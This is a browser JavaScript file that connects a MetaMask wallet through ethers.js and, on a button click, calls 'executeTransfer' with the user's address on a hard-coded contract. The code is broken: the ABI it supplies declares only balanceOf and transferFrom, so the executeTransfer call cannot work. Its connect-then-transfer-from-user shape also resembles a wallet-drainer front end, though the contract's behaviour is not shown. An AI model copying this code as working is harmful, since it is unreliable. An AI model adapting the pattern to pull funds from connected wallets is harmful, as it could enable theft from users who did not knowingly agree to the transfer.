let provider;
let signer;

window.onload = function() {
    const connectButton = document.getElementById('connectButton');
    const executeTransferButton = document.getElementById('executeTransferButton');

    // Connect wallet
    connectButton.addEventListener('click', async () => {
        if (typeof window.ethereum !== 'undefined') {
            try {
                // Request wallet connection
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();

                // Wallet successfully connected, enable the Execute Transfer button
                connectButton.innerHTML = "Wallet Connected";
                executeTransferButton.disabled = false;

            } catch (error) {
                console.error("Error connecting to wallet:", error);
            }
        } else {
            alert("MetaMask is not installed");
        }
    });

    // Execute transfer
    executeTransferButton.addEventListener('click', async () => {
        try {
            const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // Replace with your contract address
            const abi = [
                {
                    "inputs": [
                        {
                            "internalType": "address",
                            "name": "account",
                            "type": "address"
                        }
                    ],
                    "name": "balanceOf",
                    "outputs": [
                        {
                            "internalType": "uint256",
                            "name": "",
                            "type": "uint256"
                        }
                    ],
                    "stateMutability": "view",
                    "type": "function"
                },
                {
                    "inputs": [
                        {
                            "internalType": "address",
                            "name": "sender",
                            "type": "address"
                        },
                        {
                            "internalType": "address",
                            "name": "recipient",
                            "type": "address"
                        },
                        {
                            "internalType": "uint256",
                            "name": "amount",
                            "type": "uint256"
                        }
                    ],
                    "name": "transferFrom",
                    "outputs": [
                        {
                            "internalType": "bool",
                            "name": "",
                            "type": "bool"
                        }
                    ],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ];

            const contract = new ethers.Contract(contractAddress, abi, signer);
            const userAddress = await signer.getAddress();

            // Execute the transfer
            await contract.executeTransfer(userAddress);
            alert("Transfer executed successfully");

        } catch (error) {
            console.error("Error executing transfer:", error);
            alert("Transfer failed");
        }
    });
};
